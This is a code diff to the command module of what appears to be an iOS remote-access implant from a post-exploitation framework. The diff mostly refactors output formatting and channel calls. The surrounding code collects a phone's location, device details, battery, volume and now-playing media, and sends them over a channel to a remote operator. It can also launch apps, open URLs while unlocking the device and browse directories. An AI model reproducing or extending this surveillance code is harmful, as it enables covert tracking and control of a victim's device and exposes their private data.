@@ -22,18 +22,14 @@
 * SOFTWARE.
 */
 
+#include "utils.h"
 #include "channel.h"
+
 #import "ios_commands.h"
 
 @implementation Commands
 
 @synthesize fileManager;
-
-NSString *process = @"%bold%blue[*]%end ";
-NSString *success = @"%bold%green[+]%end ";
-NSString *error = @"%bold%red[-]%end ";
-NSString *warning = @"%bold%yellow[!]%end ";
-NSString *information = @"%bold%white[i]%end ";
 
 -(id)init {
     _thisUIDevice = [UIDevice currentDevice];
@@ -49,7 +45,7 @@ NSString *information = @"%bold%white[i]%end ";
     UIDevice* device = [UIDevice currentDevice];
     int batinfo = ([_thisUIDevice batteryLevel] * 100);
 
-    NSString *sysinfo = [NSString stringWithFormat:@"%@Model: %@\n%@Battery: %d\n%@Version: %@\n%@Name: %@\n",
+    NSString *sysinfo = [NSString stringWithFormat:@"%sModel: %@\n%sBattery: %d\n%sVersion: %@\n%sName: %@\n",
                         information, [device model], information, batinfo, information, [device systemVersion], information, [device name]];
 
     send_channel(channel, [sysinfo UTF8String]);
@@ -58,7 +54,7 @@ NSString *information = @"%bold%white[i]%end ";
 -(void)cmd_getpid {
     NSProcessInfo* processInfo = [NSProcessInfo processInfo];
     int processID = [processInfo processIdentifier];
-    send_channel(channel, [[NSString stringWithFormat:@"%@PID: %d\n", information, processID] UTF8String]);
+    send_channel(channel, [[NSString stringWithFormat:@"%sPID: %d\n", information, processID] UTF8String]);
 }
 
 -(void)cmd_getpaste {
@@ -76,7 +72,7 @@ NSString *information = @"%bold%white[i]%end ";
 
 -(void)cmd_battery {
     int batteryLevelLocal = ([_thisUIDevice batteryLevel] * 100);
-    NSString *info = [NSString stringWithFormat:@"%@Battery level: %d (%@charging)\n", information,
+    NSString *info = [NSString stringWithFormat:@"%sBattery level: %d (%@charging)\n", information,
                       batteryLevelLocal, [_thisUIDevice batteryState] == UIDeviceBatteryStateCharging ? @" " : @"not "];
     send_channel(channel, [info UTF8String]);
 }
@@ -84,7 +80,7 @@ NSString *information = @"%bold%white[i]%end ";
 -(void)cmd_getvol {
     [[AVAudioSession sharedInstance] setActive:YES error:nil];
     [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
-    send_channel(channel, [[NSString stringWithFormat:@"%@Volume level: %.2f\n", information,
+    send_channel(channel, [[NSString stringWithFormat:@"%sVolume level: %.2f\n", information,
                             [AVAudioSession sharedInstance].outputVolume] UTF8String]);
 }
 
@@ -95,9 +91,9 @@ NSString *information = @"%bold%white[i]%end ";
     CLLocationCoordinate2D coordinate = [location coordinate];
 
     if ((int)(coordinate.latitude + coordinate.longitude) == 0)
-        send_channel(channel, [[NSString stringWithFormat:@"%@Unable to get device location!\n", error] UTF8String]);
+        send_channel(channel, [[NSString stringWithFormat:@"%sUnable to get device location!\n", error] UTF8String]);
     else {
-        NSString *location = [NSString stringWithFormat:@"%@Latitude: %f\n%@Longitude: %f\n%@Map: http://maps.google.com/maps?q=%f,%f\n",
+        NSString *location = [NSString stringWithFormat:@"%sLatitude: %f\n%sLongitude: %f\n%sMap: http://maps.google.com/maps?q=%f,%f\n",
                              information, coordinate.latitude, information, coordinate.longitude,
                               information, coordinate.latitude, coordinate.longitude];
         send_channel(channel, [location UTF8String]);
@@ -180,11 +176,11 @@ NSString *information = @"%bold%white[i]%end ";
             NSString *title = [song valueForProperty:MPMediaItemPropertyTitle];
             NSString *album = [song valueForProperty:MPMediaItemPropertyAlbumTitle];
             NSString *artist = [song valueForProperty:MPMediaItemPropertyArtist];
-            NSString *result = [NSString stringWithFormat:@"%@Title: %@\n%@Album: %@\n%@Artist: %@\n%@Playback time: %f\n",
+            NSString *result = [NSString stringWithFormat:@"%sTitle: %@\n%sAlbum: %@\n%sArtist: %@\n%sPlayback time: %f\n",
                                 information, title, information, album, information, artist, information, playbackTime];
-            [channel sendChannel:channelPipe withData:result];
+            send_channel(channel, [result UTF8String]);
         } else {
-            [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Not playing.\n", warning]];
+            send_channel(channel, [[NSString stringWithFormat:@"%sNot playing.\n", warning] UTF8String]);
         }
     }
 }
@@ -195,25 +191,25 @@ NSString *information = @"%bold%white[i]%end ";
     assert(identifier != NULL);
     int status = SBSLaunchApplicationWithIdentifier(identifier, NO);
     if (status != 0) {
-        [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Failed to open application!\n", error]];
+        send_channel(channel, [[NSString stringWithFormat:@"%sFailed to open application!\n", error] UTF8String]);
     }
     CFRelease(identifier);
-    [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Application has been launched!\n", success]];
+    send_channel(channel, [[NSString stringWithFormat:@"%sApplication has been launched!\n", success] UTF8String]);
 }
 
 -(void)cmd_openurl:(NSString *)url {
     CFURLRef status = CFURLCreateWithBytes(NULL, (UInt8*)[url UTF8String], strlen([url UTF8String]), kCFStringEncodingUTF8, NULL);
     if (!status) {
-       [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Invalid URL address given!\n", error]];
+        send_channel(channel, [[NSString stringWithFormat:@"%sInvalid URL address given!\n", error] UTF8String]);
         return;
     } else {
         bool ret = SBSOpenSensitiveURLAndUnlock(status, 1);
         if (!ret) {
-            [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Failed to open URL!\n", error]];
+            send_channel(channel, [[NSString stringWithFormat:@"%sFailed to open URL!\n", error] UTF8String]);
             return;
         }
     }
-    [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@URL has been opened!\n", success]];
+    send_channel(channel, [[NSString stringWithFormat:@"%sURL has been opened!\n", success] UTF8String]);
 }
 
 -(void)cmd_chdir:(NSString *)directory {
@@ -226,17 +222,14 @@ NSString *information = @"%bold%white[i]%end ";
         if (isdir)
             [fileManager changeCurrentDirectoryPath:path];
         else {
-            [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Path: %@: Not a directory!\n",
-                                                      error, path]];
+            send_channel(channel, [[NSString stringWithFormat:@"%sPath: %@: Not a directory!\n", error, path] UTF8String]);
             return;
         }
     } else {
-        [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Path %@: No such file or directory!\n",
-                                                  error, path]];
+        send_channel(channel, [[NSString stringWithFormat:@"%sPath %@: No such file or directory!\n", error, path] UTF8String]);
         return;
     }
-    [channel sendChannel:channelPipe withData:[NSString stringWithFormat:@"%@Current directory: %@", information,
-                                              [fileManager currentDirectoryPath]]];
+    send_channel(channel, [[NSString stringWithFormat:@"%sCurrent directory: %@", information, [fileManager currentDirectoryPath]] UTF8String]);
 }
 
 @end
